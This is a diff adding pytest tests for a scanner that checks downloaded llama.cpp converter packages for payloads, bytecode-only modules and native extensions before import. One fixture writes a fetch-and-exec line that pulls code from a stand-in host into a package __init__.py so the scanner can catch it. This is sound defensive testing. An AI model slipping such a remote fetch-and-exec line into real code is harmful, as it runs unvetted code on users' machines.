@@ -1118,6 +1118,129 @@ def test_the_cache_key_moves_when_the_bytes_do_under_a_preserved_mtime(tmp_path)
     assert llama_cpp._conversion_sibling_info(str(root)) != before
 
 
+def _package_root(tmp_path):
+    root = tmp_path / "llama.cpp"
+    conversion = root / "conversion"
+    conversion.mkdir(parents = True)
+    (conversion / "__init__.py").write_text("from . import base\n", encoding = "utf-8")
+    (conversion / "base.py").write_text("X = 1\n", encoding = "utf-8")
+    return root
+
+
+def test_a_payload_in_gguf_py_is_scanned_too(tmp_path, monkeypatch):
+    """gguf-py comes out of the same undigested tarball as conversion/.
+
+    _hydrate_converter_sources copies both, and the entrypoint puts gguf-py on
+    sys.path itself and imports gguf. Scanning only conversion/ left a payload in
+    gguf-py/gguf/__init__.py executing under a clean entrypoint and a clean
+    conversion/, with strict mode reporting nothing.
+    """
+    llama_cpp = _load("llama_cpp_gguf_py_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    gguf = root / "gguf-py" / "gguf"
+    gguf.mkdir(parents = True)
+    (gguf / "__init__.py").write_text(
+        "import requests\nexec(requests.get('http://example.invalid/p').text)\n",
+        encoding = "utf-8",
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_the_cache_key_covers_gguf_py(tmp_path):
+    """The key decides whether the scan runs again, so a package it does not
+    cover is one a long-lived process re-imports without rescanning."""
+    llama_cpp = _load("llama_cpp_gguf_key_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    gguf = root / "gguf-py" / "gguf"
+    gguf.mkdir(parents = True)
+    module = gguf / "__init__.py"
+    module.write_text("VERSION = 1\n", encoding = "utf-8")
+
+    before = llama_cpp._conversion_sibling_info(str(root))
+    assert before is not None
+    module.write_text("VERSION = 1  # and a payload\n", encoding = "utf-8")
+    assert llama_cpp._conversion_sibling_info(str(root)) != before
+
+
+def test_a_sourceless_module_is_reported_rather_than_skipped(tmp_path, monkeypatch, caplog):
+    """The walk collected .py only, so bytecode and native modules were invisible
+    to both the scan and the cache key while CPython executed them regardless."""
+    llama_cpp = _load("llama_cpp_opaque_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    # A .pyc in a module's own place with no source beside it: CPython imports
+    # this as conversion.evil and runs the bytecode.
+    (root / "conversion" / "evil.pyc").write_bytes(b"\x00" * 64)
+
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    assert any("cannot read" in record.message for record in caplog.records), (
+        [r.message for r in caplog.records]
+    )
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def test_a_native_extension_module_is_reported(tmp_path, monkeypatch):
+    llama_cpp = _load("llama_cpp_native_probe", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    (root / "conversion" / "fast.so").write_bytes(b"\x7fELF" + b"\x00" * 32)
+
+    monkeypatch.setenv("UNSLOTH_CONVERTER_SCAN_STRICT", "1")
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    with pytest.raises(llama_cpp.ConverterScanError, match = "cannot read"):
+        llama_cpp._scan_conversion_package(str(root))
+
+
+def _pyc(flags: int) -> bytes:
+    return b"\x00" * 4 + flags.to_bytes(4, "little") + b"\x00" * 56
+
+
+@pytest.mark.parametrize(
+    "flags, reported",
+    [
+        (0b00, False),   # timestamp cache: checked against the .py that was read
+        (0b11, False),   # checked-hash cache: likewise
+        (0b01, True),    # unchecked hash: loaded as-is, whatever the source says
+    ],
+    ids = ["timestamp", "checked hash", "unchecked hash"],
+)
+def test_only_the_pycache_entry_python_never_checks_is_a_finding(
+    tmp_path, monkeypatch, caplog, flags, reported
+):
+    """__pycache__ fills up on the first real export, so reporting all of it
+    would warn on every subsequent one. Only the PEP 552 unchecked-hash cache is
+    loaded without validating the source this scan actually read.
+    """
+    llama_cpp = _load(f"llama_cpp_pycache_probe_{flags}", "unsloth_zoo/llama_cpp.py")
+
+    root = _package_root(tmp_path)
+    cache = root / "conversion" / "__pycache__"
+    cache.mkdir()
+    (cache / "base.cpython-313.pyc").write_bytes(_pyc(flags))
+
+    monkeypatch.delenv("UNSLOTH_CONVERTER_SCAN_STRICT", raising = False)
+    monkeypatch.delenv("UNSLOTH_DISABLE_CONVERTER_SCAN", raising = False)
+    caplog.clear()
+    with caplog.at_level(logging.WARNING):
+        llama_cpp._scan_conversion_package(str(root))
+    assert any("cannot read" in r.message for r in caplog.records) is reported, (
+        [r.message for r in caplog.records]
+    )
+
+
 def test_a_package_within_the_cap_says_nothing_about_size(tmp_path, monkeypatch, caplog):
     """The other half: the report must not fire on an ordinary package."""
     llama_cpp = _load("llama_cpp_cap_ok_probe", "unsloth_zoo/llama_cpp.py")
